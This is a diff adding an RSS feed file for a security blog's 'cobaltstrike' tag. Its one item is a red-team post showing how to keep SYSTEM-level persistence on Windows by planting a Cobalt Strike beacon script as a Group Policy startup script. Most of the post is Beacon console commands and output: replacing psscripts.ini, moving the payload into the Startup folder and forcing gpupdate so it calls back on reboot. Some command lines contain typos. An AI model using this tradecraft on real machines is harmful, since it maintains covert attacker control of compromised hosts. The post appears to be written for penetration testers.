@@ -1,0 +1,106 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Cyber Syndicates</title>
+    <link>http://dev.cybersyndicates.com/tags/cobaltstrike/index.xml</link>
+    <description>Recent content on Cyber Syndicates</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Alexander Rymdeko-Harvey</copyright>
+    <atom:link href="http://dev.cybersyndicates.com/tags/cobaltstrike/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>SYSTEM Context Persistence in GPO Startup Scripts</title>
+      <link>http://dev.cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/</link>
+      <pubDate>Mon, 25 Jan 2016 04:32:51 +0000</pubDate>
+      
+      <guid>http://dev.cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/</guid>
+      <description>&lt;p&gt;Interesting enough I was recently experimenting on GPO settings to configure my Applocker for testing and came by Scripts under the (Computer Configuration) settings for GPO. This defiantly caught my attention, since persistence is a cat and mouse game of stored locations / methods. &lt;strong&gt;This has been mentioned but I haven&amp;rsquo;t seen it talked about so hey why not share what I did&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.36.07-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.36.07-PM.png&#34; alt=&#34;Screen Shot 2016-01-24 at 10.36.07 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I knew I wanted to weaponize it from a pure command line standpoint as the configuration utility is pretty much point and click. Some of the assumptions are:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;You have already elevated or have Local Admin context on the box&lt;/li&gt;
+&lt;li&gt;Have the ability to upload a file in your agent (CobaltStike) / Have a Deployable .BAT/PS script&lt;/li&gt;
+&lt;li&gt;Willing to drop something to disk for persistence&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.41.18-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.41.18-PM.png&#34; alt=&#34;Screen Shot 2016-01-24 at 10.41.18 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;While that GUI looks quite simple and easy to use, that would be to dang easy! Lets get started:&lt;/p&gt;
+
+&lt;p&gt;The current process I use to deploy a CS Fully Staged Beacon:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Enumerate current GPO scripts&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Remove the psscripts.ini&lt;/li&gt;
+&lt;li&gt;Upload a new psscripts.ini&lt;/li&gt;
+&lt;li&gt;Upload the Beacon.ps1 scripts&lt;/li&gt;
+&lt;li&gt;conduct a Gpupdate&lt;/li&gt;
+&lt;li&gt;On restart you should get a beacon!&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The location of interest (while this seems trivial, do to the permissions on this directory you will have to force all commands):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Enumerate the Dir (See if a scripts.ini is built):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;beacon&amp;gt; powershell Get-ChildItem -Force C:\Windows\System32\GroupPolicy\Machine\Scripts\
+[*] Tasked beacon to run: Get-ChildItem -Force C:\Windows\System32\GroupPolicy\Machine\Scripts\
+[+] host called home, sent: 77 bytes
+[+] received output:
+ Directory: C:\Windows\System32\GroupPolicy\Machine\Scripts
+Mode LastWriteTime Length Name 
+---- ------------- ------ ---- 
+d---- 10/15/2015 6:36 PM Shutdown 
+d---- 1/24/2016 5:57 PM Startup 
+-a-h- 1/24/2016 5:28 PM 184 psscripts.ini
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Enumerate to see the current scripts in-play:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;powershell type C:\Windows\System32\GroupPolicy\Machine\Scripts\psscripts.ini
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As you will noticed the structure goes (the 0Cmd.. is incremental):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[ScriptsConfig]
+StartExecutePSFirst=true
+[Startup]
+0CmdLine=beacon2.ps1
+0Parameters=
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Simply copy this data and save it locally in a text editor and add in you PS agent name. Once you have completed this go ahead and upload to the target. A side note on this, something extremely weird happens when trying to use the built in shell / ls / cd within CS beacons. While this was a pain, I just resorted to using PS for most of it.&lt;/p&gt;
+
+&lt;p&gt;Go ahead and delete the original psscripts.ini:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;powershell Remove-Item -Force C:\Windo0ws\System32\GroupPolicy\Machine\Scripts\psscripts.ini
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After uploading the script to the C:\ drive (In my case I no ability to upload directly to the location):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;powershell Move-Item -force -path C:\psscripts.ini -destination C:\Windows\System32\GroupPolicy\Machine\Scripts\
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finally using CS Beacons Stageless PowerShel script I moved that to the required location:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;powershell Move-Item -force -path C:\beacon2.ps1 -destination C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup
+
+gpupdatep /force
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finally on reboot you should have a callback! :)&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-11.25.47-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-11.25.47-PM.png&#34; alt=&#34;Screen Shot 2016-01-24 at 11.25.47 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;To wrap up this seems like a great SYSTEM level call back and the cool part is you can add in parameters for custom payloads. Ex. if you wanted to only start at certain time you could pass the time or date that would like to restrict or even extend. This method seems extremely strong and has proved to be reliable method. Soon to come is the CS aggressor script and PS script to automate this.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
